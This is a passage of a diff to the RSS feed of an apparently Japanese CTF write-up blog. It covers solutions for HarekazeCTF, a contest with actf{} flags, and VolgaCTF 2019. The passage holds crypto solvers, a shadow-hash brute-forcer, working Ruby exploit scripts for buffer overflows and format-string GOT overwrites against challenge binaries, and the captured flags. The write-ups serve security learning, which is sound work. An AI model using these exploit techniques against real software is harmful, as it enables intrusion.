+&lt;/span&gt;&lt;span style=&#34;color:#008000&#34;&gt;payload &lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;B&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;40&lt;/span&gt;
 payload &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; p64(libc_magic)
 z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
 
-z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}&lt;/strong&gt;&lt;/p&gt;&lt;/li&gt;
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
 
 &lt;h2 id=&#34;login&#34;&gt;Login&lt;/h2&gt;
@@ -673,21 +677,19 @@ z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/
 
 &lt;ul&gt;
 &lt;li&gt;ソースコードが渡され中を見るとシーザ暗号なのでソルバを書く&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;actf{so_charming}&lt;/strong&gt;&lt;/p&gt;
+&lt;li&gt;&lt;strong&gt;actf{so_charming}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;encrypted &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;:&amp;lt;M?TLH8&amp;lt;A:KFBG@V&amp;#39;&lt;/span&gt;
 
 &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; &lt;span style=&#34;color:#008000&#34;&gt;range&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;0xff&lt;/span&gt;):
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; encrypted:
-    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#008000&#34;&gt;chr&lt;/span&gt;((&lt;span style=&#34;color:#008000&#34;&gt;ord&lt;/span&gt;(c)&lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;i) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xff&lt;/span&gt;), end&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
+    &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;for&lt;/span&gt; c &lt;span style=&#34;color:#a2f;font-weight:bold&#34;&gt;in&lt;/span&gt; encrypted:
+        &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#008000&#34;&gt;chr&lt;/span&gt;((&lt;span style=&#34;color:#008000&#34;&gt;ord&lt;/span&gt;(c)&lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt;i) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0xff&lt;/span&gt;), end&lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;)&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h3 id=&#34;really-secure-algorithm&#34;&gt;Really Secure Algorithm&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;RSAのパラメータがe, p, q, cが渡されるので復号するだけ&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;actf{really_securent_algorithm}&lt;/strong&gt;&lt;/p&gt;
+&lt;li&gt;&lt;strong&gt;actf{really_securent_algorithm}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;require_relative &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;../../tools/ctf/crypto.rb&amp;#39;&lt;/span&gt;
 
 &lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;8337989838551614633430029371803892077156162494012474856684174381868510024755832450406936717727195184311114937042673575494843631977970586746618123352329889&lt;/span&gt;
@@ -697,9 +699,7 @@ c &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;colo
 
 rsa &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;RSA&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;new(e, &lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; q, &lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt;, q)
 m &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; rsa&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;decrypt(c)
-&lt;span style=&#34;color:#008000&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;m&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;pack(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;H*&amp;#34;&lt;/span&gt;))&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
+&lt;span style=&#34;color:#008000&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;m&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;pack(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;H*&amp;#34;&lt;/span&gt;))&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h2 id=&#34;half-and-half&#34;&gt;Half and Half&lt;/h2&gt;
 
 &lt;ul&gt;
@@ -721,8 +721,8 @@ m &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; rsa&lt;span style=&#34;c
 &lt;ul&gt;
 &lt;li&gt;復号時に素数p, qが必要になるが、提供されているnは、factordbでググるとすでに割れている&lt;/li&gt;
 &lt;/ul&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;actf{crypto_lives}&lt;/strong&gt;&lt;/p&gt;
+&lt;li&gt;&lt;strong&gt;actf{crypto_lives}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;gmp&amp;#39;&lt;/span&gt;
 
 n &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;99157116611790833573985267443453374677300242114595736901854871276546481648883&lt;/span&gt;)
@@ -732,22 +732,20 @@ g &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;colo
 c &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(&lt;span style=&#34;color:#666&#34;&gt;2433283484328067719826123652791700922735828879195114568755579061061723786565164234075183183699826399799223318790711772573290060335232568738641793425546869&lt;/span&gt;)
 l &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z((&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;lcm(q &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;))
 &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#00f&#34;&gt;L&lt;/span&gt;(u, n)
-(u &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#666&#34;&gt;/&lt;/span&gt; n
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;end&lt;/span&gt;
-c_lambda &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; L(c&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;powmod(l, n&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;pow(&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;)), n)
-g_lambda &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;GMP&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;Z(L(g&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;powmod(l, n&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;pow(&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;)), n)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_i)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;invert(n)
-m &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; ((c_lambda &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; g_lambda) &lt;span style=&#34;color:#666&#34;&gt;%&lt;/span&gt; n)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_i&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;to_s(&lt;span style=&#34;color:#666&#34;&gt;16&lt;/span&gt;)
-&lt;span style=&#34;color:#008000&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;m&lt;span style=&#34;color:#666&#34;&gt;].&lt;/span&gt;pack(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;H*&amp;#34;&lt;/span&gt;))&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
+  (u &lt;span style=&#34;color:#666&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#b68&#34;&gt;/ n
+&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;end
+&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;c_lambda = L(c.powmod(l, n.pow(2)), n)
+&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;g_lambda = GMP::Z(L(g.powmod(l, n.pow(2)), n).to_s.to_i).invert(n)
+&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;m = ((c_lambda * g_lambda) % n).to_s.to_i.to_s(16)
+&lt;/span&gt;&lt;span style=&#34;color:#b68&#34;&gt;print([m].pack(&amp;#34;H*&amp;#34;))&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h2 id=&#34;binary&#34;&gt;Binary&lt;/h2&gt;
 
 &lt;h3 id=&#34;aquarium&#34;&gt;Aquarium&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;gets関数によるBOFがあるバイナリで、flag出力用の関数があるのでそこに飛ばすだけ&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;actf{overflowed_more_than_just_a_fish_tank}&lt;/strong&gt;&lt;/p&gt;
+&lt;li&gt;&lt;strong&gt;actf{overflowed_more_than_just_a_fish_tank}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
 
 &lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
@@ -771,15 +769,13 @@ z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#
 z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;: &amp;#34;&lt;/span&gt;
 z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
 
-&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h3 id=&#34;chain-of-rope&#34;&gt;Chain of Rope&lt;/h3&gt;
 
 &lt;ul&gt;
 &lt;li&gt;名前からしてROPかと思ったけど、そうではなく単純なBOFでリターンアドレスをflag出力用関数に書き換えるだけ(Aquariumとまったく同じ)&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;actf{dark_web_bargains}&lt;/strong&gt;&lt;/p&gt;
+&lt;li&gt;&lt;strong&gt;actf{dark_web_bargains}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
 
 &lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
@@ -793,9 +789,7 @@ z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#
 payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;A&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;0x38&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;+&lt;/span&gt; p64(&lt;span style=&#34;color:#666&#34;&gt;0x401231&lt;/span&gt;)
 z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
 
-&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
+&lt;span style=&#34;color:#008000&#34;&gt;p&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h3 id=&#34;purchases&#34;&gt;Purchases&lt;/h3&gt;
 
 &lt;ul&gt;
@@ -805,8 +799,8 @@ z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
 &lt;ul&gt;
 &lt;li&gt;末尾2byteですむので楽に書き換えられる&lt;/li&gt;
 &lt;/ul&gt;&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;actf{limited_edition_flag}&lt;/strong&gt;&lt;/p&gt;
+&lt;li&gt;&lt;strong&gt;actf{limited_edition_flag}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
 &lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
 &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# z = Sock.new &amp;#34;localhost&amp;#34;, 9999&lt;/span&gt;
@@ -814,9 +808,7 @@ z &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;colo
 &lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;? &amp;#34;&lt;/span&gt;
 z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4534c%10$hnAAAA&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
 &lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;else. &amp;#34;&lt;/span&gt;
-&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
+&lt;span style=&#34;color:#008000&#34;&gt;puts&lt;/span&gt; z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recv&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 &lt;h3 id=&#34;returns&#34;&gt;Returns&lt;/h3&gt;
 
 &lt;ul&gt;
@@ -825,8 +817,8 @@ z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline &lt;span style=&#
 &lt;li&gt;出力バイトの関係から分割して書き込むために、はじめに&lt;code&gt;puts@got&lt;/code&gt;をmainに書き換えておき何度もFSBを使えるようにする&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;__stack_chk_fail@got&lt;/code&gt;は、通常一度も呼ばれないため、ここのGOTをOne gadgetに書き換える&lt;/li&gt;
 &lt;li&gt;最後に、&lt;code&gt;puts@got&lt;/code&gt;を&lt;code&gt;__stack_chk_fail@got&lt;/code&gt;になおしてあげればOne gadgetが実行される&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;strong&gt;actf{no_returns_allowed}&lt;/strong&gt;&lt;/p&gt;
+&lt;li&gt;&lt;strong&gt;actf{no_returns_allowed}&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
 &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# coding: utf-8&lt;/span&gt;
 &lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;pwn&amp;#39;&lt;/span&gt;
@@ -868,9 +860,7 @@ z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;recvuntil &lt;span style=&
 payload &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;%4892c%11$hnAAAABBB%17$p&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\x18\x40\x40&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;
 z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;sendline payload
 
-z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
-&lt;/ul&gt;
-</description>
+z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     <item>
       <title>VolgaCTF 2019 writeup</title>
@@ -884,8 +874,8 @@ z&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;interact&lt;/code&gt;&lt;/
 &lt;ul&gt;
 &lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;と&lt;code&gt;encrypted.txt&lt;/code&gt;が渡される&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;には、1文字のユーザ名とその暗号化されたパスワードなどが乗っており、&lt;code&gt;encrypted.txt&lt;/code&gt;にはその1文字で構成される文字列が含まれており、単一替え字暗号だとわかる&lt;/li&gt;
-
-&lt;li&gt;&lt;p&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;のパスワードを総当たりで解き、得れた替え字表を使って置換するコードを書いて実行したらFLAG&lt;/p&gt;
+&lt;li&gt;&lt;code&gt;/etc/shadow&lt;/code&gt;のパスワードを総当たりで解き、得れた替え字表を使って置換するコードを書いて実行したらFLAG&lt;/li&gt;
+&lt;/ul&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;#!/usr/bin/env ruby&lt;/span&gt;
 
 &lt;span style=&#34;color:#008000&#34;&gt;require&lt;/span&gt; &lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#39;unix_crypt&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#408080;font-style:italic&#34;&gt;# gem install unix-crypt&lt;/span&gt;
@@ -893,24 +883,24 @@ org &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;co
 ans &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;[]&lt;/span&gt;
 lines &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;File&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;read(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;./shadow.txt&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#b62;font-weight:bold&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;&lt;/span&gt;)
 lines&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;each &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;line&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
-org &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
-enc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
-salt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;$&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
+  org &lt;span style=&#34;color:#666&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
+  enc &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
+  salt &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; line&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#ba2121&#34;&gt;&amp;#34;$&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#666&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;]&lt;/span&gt;
   
-&lt;span style=&#34;color:#666&#34;&gt;0x1f&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;upto(&lt;span style=&#34;color:#666&#34;&gt;0x7e&lt;/span&gt;) &lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;do&lt;/span&gt; &lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;i&lt;span style=&#34;color:#666&#34;&gt;|&lt;/span&gt;
-hashpass &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#800&#34;&gt;UnixCrypt&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#800&#34;&gt;SHA512&lt;/span&gt;&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;build(i&lt;span style=&#34;color:#666&#34;&gt;.&lt;/span&gt;chr, salt)
-&lt;span style=&#34;color:#008000;font-weight:bold&#34;&gt;if&lt;/span&gt; hashpass &lt;span style=&#34;color:#666&#34;&gt;==&lt;/span&gt; enc
